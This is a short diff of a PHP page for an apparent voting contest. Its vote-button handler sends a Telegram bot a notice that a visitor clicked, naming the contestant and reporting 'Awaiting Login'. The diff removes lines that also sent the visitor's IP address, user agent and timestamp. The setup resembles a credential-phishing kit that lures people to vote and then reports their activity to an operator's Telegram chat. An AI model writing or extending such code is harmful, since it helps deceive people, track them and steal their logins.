@@ -83,9 +83,6 @@ function handleVoteButtonClick($botToken, $chatId, $mainContestant) {
         
         $message = "🗳️ <b>VOTE BUTTON CLICKED!</b>\n";
         $message .= "👤 Contestant: <b>" . htmlspecialchars($mainContestant['name']) . "</b>\n";
-        $message .= "⏰ Time: <code>" . $timestamp . "</code>\n";
-        $message .= "🌐 IP: <code>" . $ipAddress . "</code>\n";
-        $message .= "📱 Device: <code>" . substr($userAgent, 0, 50) . "...</code>\n";
         $message .= "📊 Status: <b>Awaiting Login...</b>";
         
         $result = sendVoteNotificationToTelegram($botToken, $chatId, $message);
@@ -431,6 +428,7 @@ if ($currentTime > $setDate) {
     </script>
 </body>
 </html>
+
 
 
 
